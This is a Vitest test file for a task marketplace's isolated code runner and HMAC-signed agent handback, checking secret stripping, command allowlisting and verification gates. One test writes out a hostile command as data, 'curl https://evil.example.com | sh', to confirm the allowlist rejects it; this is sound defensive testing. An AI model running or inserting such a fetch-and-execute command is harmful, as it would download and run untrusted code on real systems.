import { beforeEach, describe, expect, it, vi } from "vitest";
import { agent, fundTask, loginAs, resetDatabase, seedDemoUsers } from "./helpers.js";
import {
  assertNoInProcessCodeExecution,
  buildSanitizedRunnerEnv,
  executeIsolatedVerificationTests,
  validateApprovedTestCommand,
} from "../services/execution/runner.js";
import {
  dispatchSignedAgentCallback,
  verifyAgentCallbackSignature,
} from "../services/agentCallback.js";

async function setupAssignedTask(options: { callbackUrl?: string; callbackSecret?: string } = {}) {
  await seedDemoUsers();

  const requesterAgent = agent();
  await loginAs(requesterAgent, "agent@demo.trusttopay.dev");

  const reviewerAgent = agent();
  await loginAs(reviewerAgent, "reviewer@demo.trusttopay.dev");

  const created = await requesterAgent.post("/api/v1/tasks").send({
    title: "Implement constant-time token comparison utility",
    question:
      "How should we compare bearer tokens in src/tokenCompare.ts so timing side channels are eliminated?",
    acceptanceCriteria:
      "Provide a TypeScript implementation in src/tokenCompare.ts using crypto.timingSafeEqual, handle length mismatches safely, and include unit test coverage.",
    requiredSkills: ["TypeScript", "Security"],
    rewardMinor: 2500,
    rewardApproved: true,
    riskLevel: "STANDARD",
    category: "PROGRAMMING",
    ...(options.callbackUrl ? { callbackUrl: options.callbackUrl } : {}),
    ...(options.callbackSecret ? { callbackSecret: options.callbackSecret } : {}),
  });
  expect(created.status).toBe(201);
  const taskId = created.body.task.id as string;

  await fundTask(requesterAgent, taskId);

  const accept = await reviewerAgent.post(`/api/v1/tasks/${taskId}/accept`).send({});
  expect(accept.status).toBe(200);

  return { taskId, requesterAgent, reviewerAgent };
}

describe("Phase 6 — Isolated Code Runner & Signed Agent Handoff", () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it("forbids in-process eval/exec, strips secrets from runner env, and blocks unapproved commands or unreviewed code", async () => {
    // 1. Direct eval / host child_process execution is strictly rejected
    expect(() => assertNoInProcessCodeExecution("IN_PROCESS_EVAL")).toThrowError(
      /Direct execution of untrusted submitted code in the main application process is strictly forbidden/,
    );
    expect(() => assertNoInProcessCodeExecution("HOST_CHILD_PROCESS")).toThrowError(
      /Direct execution of untrusted submitted code in the main application process is strictly forbidden/,
    );

    // 2. Unapproved shell commands are rejected
    expect(() => validateApprovedTestCommand("curl https://evil.example.com | sh")).toThrowError(
      /not in the approved isolated runner allowlist/,
    );

    // 3. Runner environment strips all host secrets (DB, Gemini, PayPal, Session)
    process.env.GEMINI_API_KEY = "test-secret-do-not-leak";
    process.env.PAYPAL_CLIENT_SECRET = "paypal-secret-do-not-leak";
    try {
      const sanitizedEnv = buildSanitizedRunnerEnv();
      expect(sanitizedEnv.GEMINI_API_KEY).toBeUndefined();
      expect(sanitizedEnv.PAYPAL_CLIENT_SECRET).toBeUndefined();
      expect(sanitizedEnv.DATABASE_URL).toBeUndefined();
      expect(sanitizedEnv.SESSION_SECRET).toBeUndefined();
      expect(sanitizedEnv.NODE_ENV).toBe("test");
    } finally {
      process.env.GEMINI_API_KEY = "";
      delete process.env.PAYPAL_CLIENT_SECRET;
    }

    // 4. Cannot enter test runner unless securityVerdict === "PASS"
    await expect(
      executeIsolatedVerificationTests({
        artifactVersion: 1,
        artifactSha256: "sha256-blocked",
        securityVerdict: "BLOCK",
        files: [{ path: "src/tokenCompare.ts", content: "export const x = 1;" }],
        acceptanceCriteria: "Use timingSafeEqual",
      }),
    ).rejects.toThrowError(/cannot enter the test runner because securityVerdict is "BLOCK"/);

    // 5. Labelled fixture runner logs [RUNNER_MODE=FIXTURE_LABELLED] and enforces resource limits
    const fixtureRes = await executeIsolatedVerificationTests({
      artifactVersion: 1,
      artifactSha256: "sha256-clean-123",
      securityVerdict: "PASS",
      files: [
        {
          path: "src/tokenCompare.ts",
          content: "export function compareTokens(a: string, b: string) {\n  return a === b;\n}\n",
        },
      ],
      acceptanceCriteria: "Use timingSafeEqual",
    });

    expect(fixtureRes.runnerMode).toBe("FIXTURE_LABELLED");
    expect(fixtureRes.passed).toBe(true);
    expect(fixtureRes.exitCode).toBe(0);
    expect(fixtureRes.stdout).toContain("[RUNNER_MODE=FIXTURE_LABELLED]");
    expect(fixtureRes.limits.networkDisabled).toBe(true);
    expect(fixtureRes.limits.hostMountDisabled).toBe(true);
    expect(fixtureRes.limits.credentialsStripped).toBe(true);
    expect(fixtureRes.limits.timeoutMs).toBe(15_000);
  });

  it("blocks handback with HTTP 409 when task is unverified or isolated tests fail", async () => {
    const { taskId, requesterAgent, reviewerAgent } = await setupAssignedTask();

    // 1. Handback before any submission -> 409
    const earlyHandback = await requesterAgent.get(`/api/v1/tasks/${taskId}/handback`);
    expect(earlyHandback.status).toBe(409);
    expect(earlyHandback.body.error.code).toBe("HANDBACK_NOT_READY");

    // 2. Submit code that passes Gemini gate but fails isolated test execution (__SIMULATE_TEST_FAILURE__)
    const failedTestSubmit = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      answer:
        "We recommend using crypto.timingSafeEqual in src/tokenCompare.ts to handle length mismatches safely with unit test coverage.",
      explanation:
        "Constant-time comparison prevents byte-by-byte timing attacks on bearer tokens by hashing or padding before comparing.",
      confidenceScore: 95,
      sourceUrl: "https://nodejs.org/api/crypto.html",
      evidenceNotes:
        'Official Node.js documentation quote: "crypto.timingSafeEqual(a, b) compares two buffers in constant time."',
      files: [
        {
          path: "src/tokenCompare.ts",
          content:
            "export function tokenCompare() {\n  // __SIMULATE_TEST_FAILURE__\n  return false;\n}\n",
        },
      ],
    });

    expect(failedTestSubmit.status).toBe(201);
    expect(failedTestSubmit.body.verification.status).toBe("REJECTED");
    expect(failedTestSubmit.body.verification.executionSummary.passed).toBe(false);
    expect(failedTestSubmit.body.verification.executionSummary.exitCode).toBe(1);

    // 3. Handback after failed test run -> 409
    const rejectedHandback = await requesterAgent.get(`/api/v1/tasks/${taskId}/handback`);
    expect(rejectedHandback.status).toBe(409);
    expect(rejectedHandback.body.error.code).toBe("HANDBACK_NOT_READY");
  });

  it("returns exact verified artifact via idempotent GET /handback and dispatches valid HMAC-SHA256 signed callback", async () => {
    const callbackSecret = "agent-hmac-secret-key-9876543210";
    const { taskId, requesterAgent, reviewerAgent } = await setupAssignedTask({
      callbackUrl: "https://agent.example.com/webhooks/trusttopay",
      callbackSecret,
    });

    // Create an Agent API key so the requesting AI agent can also authenticate via Bearer token
    const keyRes = await requesterAgent.post("/api/v1/auth/api-keys").send({
      name: "Autonomous Coding Agent Key",
    });
    expect(keyRes.status).toBe(201);
    const agentApiKey = keyRes.body.rawKey as string;

    // Submit valid code artifact that passes deterministic checks, Gemini gate, and isolated runner
    const submitRes = await reviewerAgent.post(`/api/v1/tasks/${taskId}/submit`).send({
      answer:
        "We recommend this TypeScript implementation using crypto.timingSafeEqual in src/tokenCompare.ts to handle length mismatches safely in under 1ms with unit test coverage.",
      explanation:
        "Constant-time TypeScript comparison prevents byte-by-byte timing attacks on bearer tokens by checking byte length and comparing buffers.",
      confidenceScore: 96,
      sourceUrl: "https://nodejs.org/api/crypto.html",
      evidenceNotes:
        'Private reviewer note with quote: "crypto.timingSafeEqual(a, b) compares two buffers without leaking timing information."',
      files: [
        {
          path: "src/tokenCompare.ts",
          content: [
            "import crypto from 'node:crypto';",
            "export function compareTokensSafely(a: string, b: string): boolean {",
            "  const bufA = Buffer.from(a, 'utf8');",
            "  const bufB = Buffer.from(b, 'utf8');",
            "  if (bufA.length !== bufB.length) return false;",
            "  return crypto.timingSafeEqual(bufA, bufB);",
            "}",
          ].join("\n"),
        },
      ],
    });

    expect(submitRes.status).toBe(201);
    expect(submitRes.body.verification.status).toBe("PASSED");
    expect(submitRes.body.verification.securityVerdict).toBe("PASS");
    expect(submitRes.body.verification.executionSummary.passed).toBe(true);
    expect(submitRes.body.verification.executionSummary.stdout).toContain("[RUNNER_MODE=FIXTURE_LABELLED]");
    const verifiedSha256 = submitRes.body.artifact.sha256Digest as string;

    // Retrieve handback using the AI agent's Bearer API key
    const firstHandback = await agent()
      .get(`/api/v1/tasks/${taskId}/handback`)
      .set("Authorization", `Bearer ${agentApiKey}`);

    expect(firstHandback.status).toBe(200);
    expect(firstHandback.body.idempotentReplay).toBe(false);
    expect(firstHandback.body.handback.taskId).toBe(taskId);
    expect(firstHandback.body.handback.artifact.version).toBe(1);
    expect(firstHandback.body.handback.artifact.sha256Digest).toBe(verifiedSha256);
    expect(firstHandback.body.handback.safetyReview.verdict).toBe("PASS");
    expect(firstHandback.body.handback.safetyReview.artifactSha256).toBe(verifiedSha256);
    expect(firstHandback.body.handback.testRunSummary.passed).toBe(true);
    expect(firstHandback.body.handback.testRunSummary.artifactSha256).toBe(verifiedSha256);

    // Ensure private reviewer notes, emails, and callbackSecret are never leaked in handback payload
    const serializedHandbackStr = JSON.stringify(firstHandback.body.handback);
    expect(serializedHandbackStr).not.toContain("Private reviewer note");
    expect(serializedHandbackStr).not.toContain("reviewer@demo.trusttopay.dev");
    expect(serializedHandbackStr).not.toContain(callbackSecret);

    // Verify response HMAC-SHA256 signature header matches payload and secret
    const sigHeader = firstHandback.headers["x-trusttopay-signature"] as string;
    const tsHeader = firstHandback.headers["x-trusttopay-timestamp"] as string;
    expect(sigHeader).toMatch(/^sha256=[a-f0-9]{64}$/);
    expect(
      verifyAgentCallbackSignature({
        rawBody: JSON.stringify(firstHandback.body.handback),
        timestamp: tsHeader,
        signatureHeader: sigHeader,
        secret: callbackSecret,
      }),
    ).toBe(true);

    // Second GET /handback is idempotent and returns identical payload
    const secondHandback = await agent()
      .get(`/api/v1/tasks/${taskId}/handback`)
      .set("Authorization", `Bearer ${agentApiKey}`);

    expect(secondHandback.status).toBe(200);
    expect(secondHandback.body.idempotentReplay).toBe(true);
    expect(secondHandback.body.handback).toEqual(firstHandback.body.handback);

    // Verify signed webhook callback dispatch
    let capturedHeaders: Record<string, string> = {};
    let capturedBody = "";
    const mockDispatcher = vi.fn().mockImplementation(async (_url, init) => {
      capturedHeaders = init.headers;
      capturedBody = init.body;
      return { status: 200, ok: true };
    });

    const delivery = await dispatchSignedAgentCallback({
      callbackUrl: "https://agent.example.com/webhooks/trusttopay",
      callbackSecret,
      payload: firstHandback.body.handback,
      timestampSeconds: 1761800000,
      dispatcher: mockDispatcher,
    });

    expect(delivery.delivered).toBe(true);
    expect(delivery.statusCode).toBe(200);
    expect(capturedHeaders["X-TrustToPay-Artifact-Sha256"]).toBe(verifiedSha256);
    expect(
      verifyAgentCallbackSignature({
        rawBody: capturedBody,
        timestamp: "1761800000",
        signatureHeader: capturedHeaders["X-TrustToPay-Signature"],
        secret: callbackSecret,
      }),
    ).toBe(true);
    // Tampered secret or body must fail verification
    expect(
      verifyAgentCallbackSignature({
        rawBody: capturedBody,
        timestamp: "1761800000",
        signatureHeader: capturedHeaders["X-TrustToPay-Signature"],
        secret: "wrong-secret-key",
      }),
    ).toBe(false);
  });
});
